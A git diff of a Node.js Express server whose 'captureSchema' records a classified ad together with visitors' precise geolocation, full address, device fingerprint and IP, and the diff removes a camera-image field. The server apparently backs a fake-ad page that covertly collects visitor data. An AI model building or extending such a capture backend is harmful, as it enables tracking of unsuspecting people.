@@ -4,7 +4,6 @@ const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
 const path = require('path');
-require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -16,7 +15,6 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 200 }));
 app.use(express.static(__dirname));
-app.use(express.static(path.join(__dirname, 'public')));
 
 const captureSchema = new mongoose.Schema({
     id: { type: Number, required: true, unique: true },
@@ -24,7 +22,6 @@ const captureSchema = new mongoose.Schema({
     timestamp: { type: Date, default: Date.now },
     ad: { title: String, category: String, description: String, price: String, location: String, phone: String },
     location: { lat: Number, lng: Number, accuracy: Number, street: String, city: String, state: String, country: String, postcode: String, fullAddress: String },
-    cameraImage: String,
     device: { userAgent: String, platform: String, language: String, screen: String, timezone: String, ip: String },
     ip: String
 }, { timestamps: true });
@@ -79,7 +76,7 @@ async function startServer() {
     try {
         await mongoose.connect(MONGODB_URI);
         console.log('✅ MongoDB connected');
-        app.listen(PORT, '0.0.0.0', () => console.log(`Server running on http://localhost:${PORT}`));
+        app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
     } catch (error) {
         console.error('MongoDB error:', error);
         process.exit(1);
